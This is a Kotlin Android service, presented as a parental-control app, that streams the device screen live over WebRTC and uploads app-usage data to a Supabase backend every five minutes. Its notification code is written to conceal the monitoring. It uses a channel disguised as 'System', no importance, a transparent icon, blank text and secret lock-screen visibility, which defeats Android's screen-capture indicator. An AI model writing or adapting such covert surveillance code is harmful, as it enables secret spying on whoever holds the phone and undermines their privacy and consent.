package com.parentalcontrol.kidmonitor

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.*
import android.util.Log
import androidx.lifecycle.LifecycleService
import kotlinx.coroutines.*
import java.util.UUID

/**
 * Core monitoring service.
 * - Foreground service (silent notification)
 * - Gets MediaProjection token IMMEDIATELY in onStartCommand() to satisfy Android 14+
 *   timing requirements (must call getMediaProjection() within ~5s of permission grant)
 * - Passes the live MediaProjection object to WebRTCKidClient (not the raw Intent)
 * - Writes device info + app usage to Supabase Postgres via SupabaseManager
 */
class MonitorService : LifecycleService() {

    private lateinit var supabaseManager: SupabaseManager
    private lateinit var usageStatsHelper: UsageStatsHelper
    private var webRTCKidClient: WebRTCKidClient? = null

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var usageJob: Job? = null

    private val prefs by lazy { getSharedPreferences(SetupActivity.PREFS_NAME, MODE_PRIVATE) }
    private val deviceId: String by lazy {
        prefs.getString(SetupActivity.KEY_DEVICE_ID, null) ?: UUID.randomUUID().toString().also {
            prefs.edit().putString(SetupActivity.KEY_DEVICE_ID, it).apply()
        }
    }
    private val pairingKey: String by lazy {
        prefs.getString(SetupActivity.KEY_PAIRING_KEY, null) ?: run {
            val key = UUID.randomUUID().toString().replace("-", "").take(8).uppercase()
            prefs.edit().putString(SetupActivity.KEY_PAIRING_KEY, key).apply()
            key
        }
    }

    companion object {
        var isRunning = false
            private set

        private const val TAG        = "MonitorService"
        private const val CHANNEL_ID  = "mon_svc_v2" // Bumped — forces fresh silent channel
        private const val NOTIF_ID    = 1
        const val ACTION_START = "ACTION_START_MONITOR"
        const val EXTRA_RESULT_CODE = "result_code"
        const val EXTRA_DATA = "projection_data"

        fun startWithProjection(context: Context, resultCode: Int, data: Intent) {
            val intent = Intent(context, MonitorService::class.java).apply {
                action = ACTION_START
                putExtra(EXTRA_RESULT_CODE, resultCode)
                putExtra(EXTRA_DATA, data)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
    }

    // ─── Lifecycle ────────────────────────────────────────────────────
    override fun onCreate() {
        super.onCreate()
        isRunning = true
        supabaseManager = SupabaseManager(deviceId, pairingKey)
        usageStatsHelper = UsageStatsHelper(this)

        createNotificationChannel()

        // Must call startForeground with FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
        val notif = buildNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIF_ID, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
        } else {
            startForeground(NOTIF_ID, notif)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)

        if (intent?.action == ACTION_START) {
            val resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, Activity.RESULT_CANCELED)
            val data = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                intent.getParcelableExtra(EXTRA_DATA, Intent::class.java)
            } else {
                @Suppress("DEPRECATION")
                intent.getParcelableExtra<Intent>(EXTRA_DATA)
            }

            if (resultCode == Activity.RESULT_OK && data != null) {
                startMonitoring(resultCode, data)
            } else {
                Log.e(TAG, "Missing projection data: resultCode=$resultCode")
            }
        }

        return START_STICKY
    }

    override fun onDestroy() {
        isRunning = false
        usageJob?.cancel()
        serviceScope.cancel()
        webRTCKidClient?.stop()
        webRTCKidClient = null
        super.onDestroy()
    }

    // ─── Monitoring ───────────────────────────────────────────────────
    private fun startMonitoring(resultCode: Int, data: Intent) {
        // Register device & write online status to Supabase Postgres
        serviceScope.launch {
            try {
                supabaseManager.registerDevice(Build.MODEL, Build.MANUFACTURER)
                supabaseManager.writeStatus("WebRTC ready")
            } catch (e: Exception) {
                Log.e(TAG, "registerDevice: ${e.message}")
            }
        }

        // Start WebRTC screen share — passes live MediaProjection (not raw Intent)
        webRTCKidClient = WebRTCKidClient(
            context        = applicationContext,
            projectionData = data,
            deviceId       = deviceId,
            pairingKey     = pairingKey
        )
        webRTCKidClient!!.start()
        Log.d(TAG, "WebRTC screen client started for device $deviceId")

        // App usage stats loop — every 5 minutes
        usageJob = serviceScope.launch {
            while (isActive) {
                try {
                    val stats = usageStatsHelper.getUsageStats()
                    supabaseManager.uploadUsageStats(stats)
                    supabaseManager.writeStatus("WebRTC ready")
                } catch (e: Exception) {
                    Log.e(TAG, "Usage upload: ${e.message}")
                }
                delay(5 * 60 * 1000L)
            }
        }
    }

    // ─── Notification ─────────────────────────────────────────────────
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, "System",
                NotificationManager.IMPORTANCE_NONE  // Hidden: no drawer entry, no status bar icon
            ).apply {
                setShowBadge(false)
                setSound(null, null)
                enableLights(false)
                enableVibration(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
        }
        return builder
            .setSmallIcon(R.drawable.ic_transparent) // Transparent icon — nothing shown in status bar
            .setContentTitle("")                     // Blank — nothing readable
            .setContentText("")
            .setVisibility(Notification.VISIBILITY_SECRET)
            .build()
            .also { it.flags = it.flags or Notification.FLAG_NO_CLEAR } // Non-dismissible without setOngoing
    }
}
